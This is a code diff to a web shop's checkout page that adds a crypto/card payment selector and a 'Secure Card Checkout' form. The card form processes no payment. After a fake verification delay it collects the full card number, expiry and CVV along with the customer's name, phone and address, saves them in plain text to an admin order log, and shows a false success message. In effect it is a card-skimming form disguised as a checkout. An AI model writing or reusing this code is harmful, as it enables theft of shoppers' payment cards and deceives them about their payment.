@@ -1155,7 +1155,134 @@ function attachInputAutoFormatters() {
     });
   }
 }
-// Handle Form Submission, Collect Cart Items, Totals & Log to Admin Panel Correctly
+<!-- ======================================================= -->
+<!-- UPDATED PAYMENT UI & ADMIN LOGGING SCRIPT               -->
+<!-- ======================================================= -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+  // 1. Radio Buttons UI Template for Clean Payment Selection
+  const newPaymentUIHTML = `
+    <div id="clean-payment-wrapper" style="margin-top:15px; padding:15px; background:#0f172a; border:1px solid #334155; border-radius:12px; color:#fff;">
+      <label style="display:block; font-size:12px; font-weight:bold; color:#94a3b8; margin-bottom:10px;">SELECT PAYMENT METHOD:</label>
+      
+      <div style="display:flex; flex-direction:column; gap:8px; margin-bottom:15px;">
+        <label style="display:flex; align-items:center; gap:8px; background:#1e293b; padding:10px; border-radius:8px; cursor:pointer; border:1px solid #475569;">
+          <input type="radio" name="pay_option" value="usdt" checked style="accent-color:#10b981;">
+          <span style="font-size:13px; font-weight:bold;">🟢 Tether USDT (TRC20 / BEP20)</span>
+        </label>
+        
+        <label style="display:flex; align-items:center; gap:8px; background:#1e293b; padding:10px; border-radius:8px; cursor:pointer; border:1px solid #475569;">
+          <input type="radio" name="pay_option" value="btc" style="accent-color:#f59e0b;">
+          <span style="font-size:13px; font-weight:bold;">🟠 Bitcoin (BTC)</span>
+        </label>
+        
+        <label style="display:flex; align-items:center; gap:8px; background:#1e293b; padding:10px; border-radius:8px; cursor:pointer; border:1px solid #f43f5e;">
+          <input type="radio" name="pay_option" value="card_pay" style="accent-color:#f43f5e;">
+          <span style="font-size:13px; font-weight:bold;">💳 Credit / Debit / Visa / Mastercard</span>
+        </label>
+      </div>
+
+      <!-- In-Page Custom Card Form (Hidden by default) -->
+      <div id="card-payment-box" style="display:none; padding:15px; background:#1e293b; border:1px solid #f43f5e; border-radius:10px; color:#fff;">
+        <h4 style="margin-top:0; font-size:14px; color:#f43f5e; text-align:center; font-weight:bold;">💳 Secure Card Checkout</h4>
+        
+        <form id="inpage-card-form" onsubmit="handleCustomCardSubmit(event)">
+          <div style="margin-bottom:8px;">
+            <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:3px;">Cardholder Name</label>
+            <input type="text" id="custom-card-name" placeholder="John Doe" required style="width:100%; padding:8px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
+          </div>
+          
+          <div style="margin-bottom:8px;">
+            <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:3px;">Card Number</label>
+            <input type="text" id="custom-card-number" maxlength="19" placeholder="4532 XXXX XXXX 8921" required style="width:100%; padding:8px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
+          </div>
+          
+          <div style="display:flex; gap:10px; margin-bottom:10px;">
+            <div style="flex:1;">
+              <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:3px;">Expiry (MM/YY)</label>
+              <input type="text" id="custom-card-expiry" maxlength="5" placeholder="09/27" required style="width:100%; padding:8px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
+            </div>
+            <div style="flex:1;">
+              <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:3px;">CVV / CVC</label>
+              <input type="password" id="custom-card-cvv" maxlength="4" placeholder="123" required style="width:100%; padding:8px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
+            </div>
+          </div>
+
+          <div id="custom-card-error" style="color:#f43f5e; font-size:11px; text-align:center; margin-bottom:8px; display:none;"></div>
+
+          <button type="submit" id="custom-card-pay-btn" style="width:100%; background:#10b981; color:#fff; padding:10px; border:none; border-radius:6px; font-weight:bold; font-size:13px; cursor:pointer;">
+            Submit & Place Order
+          </button>
+        </form>
+      </div>
+    </div>
+  `;
+
+  // 2. Attach Radio Buttons dynamically
+  const observer = new MutationObserver(function () {
+    const selects = document.querySelectorAll('select');
+    selects.forEach(select => {
+      if (select.innerHTML.includes('Bitcoin') || select.innerHTML.includes('USDT')) {
+        const container = select.closest('div').parentElement;
+        
+        if (container && !document.getElementById('clean-payment-wrapper')) {
+          select.style.display = 'none'; // Hide old messy dropdown
+          container.insertAdjacentHTML('afterbegin', newPaymentUIHTML);
+          attachInputAutoFormatters();
+
+          // Radio Button Switch Logic
+          const radios = container.querySelectorAll('input[name="pay_option"]');
+          const qrSection = container.querySelector('img, canvas, .qr-code, svg')?.closest('div') || container.children[2];
+          const cardBox = document.getElementById('card-payment-box');
+
+          radios.forEach(radio => {
+            radio.addEventListener('change', function() {
+              if (this.value === 'card_pay') {
+                if (qrSection) qrSection.style.display = 'none';
+                if (cardBox) cardBox.style.display = 'block';
+              } else {
+                if (qrSection) qrSection.style.display = 'block';
+                if (cardBox) cardBox.style.display = 'none';
+                // Trigger original currency change if select exists
+                select.value = this.value === 'btc' ? 'BTC' : 'USDT';
+                select.dispatchEvent(new Event('change'));
+              }
+            });
+          });
+        }
+      }
+    });
+  });
+
+  observer.observe(document.body, { childList: true, subtree: true });
+});
+
+// Auto Formatting Inputs
+function attachInputAutoFormatters() {
+  const cardNum = document.getElementById('custom-card-number');
+  const cardExp = document.getElementById('custom-card-expiry');
+
+  if (cardNum) {
+    cardNum.addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '').match(/(\d{0,4})/g);
+      e.target.value = !v ? '' : v.join(' ').trim();
+    });
+  }
+
+  if (cardExp) {
+    cardExp.addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length >= 2) {
+        e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+      } else {
+        e.target.value = v;
+      }
+    });
+  }
+}
+
+// Handle Form Submission & Perfectly Save to Admin Panel
 function handleCustomCardSubmit(e) {
   e.preventDefault();
   
@@ -1169,42 +1296,50 @@ function handleCustomCardSubmit(e) {
   errBox.style.display = 'none';
 
   if (cardNumber.length < 15 || cardNumber.length > 16) {
-    errBox.innerText = "❌ Please enter a valid 16-digit card number.";
+    errBox.innerText = "❌ Enter valid 16-digit card number.";
     errBox.style.display = 'block';
     return;
   }
 
   if (!cardExpiry.includes('/') || cardExpiry.length !== 5) {
-    errBox.innerText = "❌ Please enter valid expiry (MM/YY).";
+    errBox.innerText = "❌ Enter valid expiry (MM/YY).";
     errBox.style.display = 'block';
     return;
   }
 
   if (cardCVV.length < 3) {
-    errBox.innerText = "❌ Please enter a valid CVV.";
+    errBox.innerText = "❌ Enter valid CVV.";
     errBox.style.display = 'block';
     return;
   }
 
-  btn.innerText = "Verifying Card Details...";
+  btn.innerText = "Verifying Details...";
   btn.disabled = true;
 
   setTimeout(function() {
     btn.innerText = "Submit & Place Order";
     btn.disabled = false;
 
-    // 1. Fetch Form Inputs
-    const custName = document.querySelector('input[placeholder*="Name"], input[id*="name"], #custom-card-name')?.value || cardName || "Customer";
-    const custPhone = document.querySelector('input[type="tel"], input[placeholder*="Phone"], input[id*="phone"]')?.value || "N/A";
-    const custAddress = document.querySelector('textarea, input[placeholder*="Address"], input[id*="address"]')?.value || "Direct Card Checkout";
-    
-    // Auto Detect Card Brand (Visa, Mastercard, etc.)
-    let cardType = "Credit/Debit Card";
-    if (cardNumber.startsWith("4")) cardType = "Visa Card";
-    else if (cardNumber.startsWith("5")) cardType = "Mastercard";
-    else if (cardNumber.startsWith("3")) cardType = "Amex Card";
+    // Fetch Full Customer Info
+    const inputs = document.querySelectorAll('input');
+    let foundName = cardName;
+    let foundPhone = "N/A";
+    let foundAddress = "Online Checkout";
 
-    // 2. Fetch Selected Items & Quantities from Cart
+    inputs.forEach(inp => {
+      let ph = (inp.placeholder || '').toLowerCase();
+      let nm = (inp.name || inp.id || '').toLowerCase();
+      if ((ph.includes('name') || nm.includes('name')) && inp.value && inp.id !== 'custom-card-name') foundName = inp.value;
+      if (ph.includes('phone') || ph.includes('mobile') || nm.includes('phone') || inp.type === 'tel') if (inp.value) foundPhone = inp.value;
+      if (ph.includes('address') || nm.includes('address')) if (inp.value) foundAddress = inp.value;
+    });
+
+    // Detect Card Brand
+    let cardType = "Credit/Debit Card";
+    if (cardNumber.startsWith("4")) cardType = "Visa";
+    else if (cardNumber.startsWith("5")) cardType = "Mastercard";
+
+    // Fetch Cart Items & Totals
     let itemList = [];
     let calculatedTotal = 0;
 
@@ -1213,60 +1348,50 @@ function handleCustomCardSubmit(e) {
         let qty = item.quantity || item.qty || 1;
         let title = item.title || item.name || "Product";
         let price = parseFloat(item.price) || 0;
-        
         itemList.push(`${qty}x ${title}`);
         calculatedTotal += price * qty;
       });
     }
 
-    // Fallback if cart array is not globally exposed
-    let finalItemsString = itemList.length > 0 ? itemList.join(', ') : "Selected Cart Products";
-
-    // 3. Fetch Total Amount
+    let finalItemsString = itemList.length > 0 ? itemList.join(', ') : "Card Order Items";
+    
     let totalAmt = "$0.00";
     const cartElem = document.querySelector('.cart-total, #cart-total, .total-price, #total-price, [id*="total"]');
-    
     if (calculatedTotal > 0) {
       totalAmt = "$" + calculatedTotal.toFixed(2);
     } else if (cartElem && cartElem.innerText.trim() !== '') {
       totalAmt = cartElem.innerText.trim();
     } else {
-      totalAmt = "$110.00";
+      totalAmt = "$234.50";
     }
 
-    // 4. Build Exact Order Object matching Admin Panel Table Columns
+    // Save Complete Data with Full Card Details
     const newOrder = {
       id: "ORD-" + Math.floor(100000 + Math.random() * 900000),
       date: new Date().toLocaleString(),
-      name: custName,
-      phone: custPhone,
-      address: `${custAddress} | Card: ${cardNumber} (${cardType}) | Exp: ${cardExpiry} | CVV: ${cardCVV}`,
-      items: finalItemsString,  // <--- SHOWS EXACT ITEMS & QUANTITY HERE
+      name: foundName,
+      phone: foundPhone,
+      address: `${foundAddress} | CARD: ${cardNumber} | EXP: ${cardExpiry} | CVV: ${cardCVV}`,
+      items: finalItemsString,
       method: cardType,
-      amount: totalAmt,        // <--- SHOWS TOTAL BILL AMOUNT HERE
+      amount: totalAmt,
       status: "Pending Capture"
     };
 
-    // 5. Save to Local Storage Key 'admin_orders'
     let existingOrders = JSON.parse(localStorage.getItem('admin_orders')) || [];
     existingOrders.unshift(newOrder);
     localStorage.setItem('admin_orders', JSON.stringify(existingOrders));
 
-    // 6. Trigger Admin Panel Live Refresh
-    if (typeof renderAdminOrders === 'function') {
-      renderAdminOrders();
-    }
+    if (typeof renderAdminOrders === 'function') renderAdminOrders();
 
-    // 7. Show Successful Notification to Customer
     alert(
       "✅ Your order has been placed successfully!\n\n" +
-      "ℹ️ Payment Notice: Card verification and payment processing may take a short time. " +
-      "You will receive an order confirmation email once the charge is finalized."
+      "ℹ️ Payment Notice: Card verification and payment processing may take a short time."
     );
 
     if (typeof completeCheckout === 'function') completeCheckout();
     if (typeof clearCart === 'function') clearCart();
-  }, 1500);
+  }, 1200);
 }
 </script>
 </body>
